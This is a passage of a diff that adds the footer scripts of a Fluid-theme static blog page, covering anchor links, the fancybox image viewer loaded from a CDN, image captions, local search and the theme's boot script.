+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
